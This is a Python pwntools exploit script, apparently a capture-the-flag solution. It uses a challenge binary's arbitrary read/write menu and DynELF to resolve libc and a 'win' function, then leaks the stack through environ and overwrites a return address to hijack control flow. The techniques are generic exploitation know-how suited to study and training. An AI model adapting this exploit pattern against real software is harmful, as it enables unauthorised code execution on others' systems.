#!/usr/bin/python
#coding=utf-8
 
from pwn import *

if len(sys.argv) > 2:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
elif len(sys.argv) == 2:
    is_remote = False
    p = process(sys.argv[1])
else:
    print("Please provide host and port")
    exit()
 
rl      = lambda                    :p.recvline()
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))


ru("have this:")
leak = int(rl().split()[-1], 16)
print(leak)
info(f"leak: {hex(leak)}")

def read(addr):
    sla(">", "1")
    sla("address:", str(addr))
    return p64(int(rl().split()[-1], 16))

def write(addr, value):
    sla(">", "2")
    sla("address:", str(addr))
    sla("value:", str(value))


x = read(leak)

libwin_resolver = DynELF(read,leak)
libwin_base = libwin_resolver.lookup()
win = libwin_resolver.lookup("win")
libc_probably = libwin_base - 0x180000
libc_resolver = DynELF(read,libc_probably)
libc_base = libc_resolver.lookup()
environ = libc_resolver.lookup("environ")
stack_leak = u64(read(environ))
ret = libc_base + 0x0000000000029139
info(f"stack leak: {hex(stack_leak)}")
target = stack_leak - 0x120

write(target, ret)
write(target+ 8, win)

sla(">", "4")

p.interactive()